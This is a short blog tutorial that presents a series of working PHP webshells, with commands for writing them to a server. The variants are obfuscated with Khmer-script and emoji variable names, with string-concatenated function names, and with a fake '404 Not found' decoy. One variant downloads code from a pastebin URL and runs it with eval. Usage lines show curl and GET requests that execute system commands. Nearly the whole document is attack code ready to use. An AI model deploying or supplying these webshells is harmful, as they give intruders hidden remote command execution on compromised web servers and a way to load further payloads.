---
title: "UniSh3ll Tutorial"
date: 2020-05-26T14:28:44+07:00
description: A family of atom(s) php webshell script.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: thik
authorEmoji: 🐱
tags:
- php
categories:
- WebShell
series:
- WebApp
image: images/feature/code-file.png
---

#### USh3ll-I

{{< highlight php "linenos=table" >}}
<?=$_=$_GET;$_[_]($_[0]); //.php?_=system&0=id;ls+-la
{{< / highlight >}}

#### USh3ll-II

{{< highlight bash "linenos=table" >}}
echo -e "<?=\`\$_REQUEST[_]\`?>" > uni.php
{{< / highlight >}}


{{< highlight bash "linenos=table" >}}
echo -e "<?=\`\$_REQUEST[_]\`?>\r<?='404 Not found';?>" > uni.php
{{< / highlight >}}

<b>Usage:</b> <i>curl localhost/uni.php -d _=ls+-la</i>

#### USh3ll-III

{{< highlight php "linenos=table" >}}
<?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&$ា[ម]($ា[ប]); //.php?ត=true&ល=ស្រលាញ់&ម=passthru&ប=ls
{{< / highlight >}}

{{< highlight php "linenos=table" >}}
<?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&$ា[ម]($ា[ប]); eval('?>'.file_get_contents($ា[ដ]));?>
{{< / highlight >}}

<b>Usage:</b> <i>uni.php?ត=true&ល=ស្រលាញ់&ម=passthru&ប=id&ដ=https://pastebin.com/raw/JfLvh0MG</i>

#### USh3ll-IV

{{< highlight php "linenos=table" >}}
<?=$a="sy";$b="stem";$c=$a.$b; $c("uname -a"); //get method
{{< / highlight >}}

#### USh3ll-V

{{< highlight php "linenos=table" >}}
<?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v '127.0.0.1:8080/uni.php?0=system&1=la+-la'
{{< / highlight >}}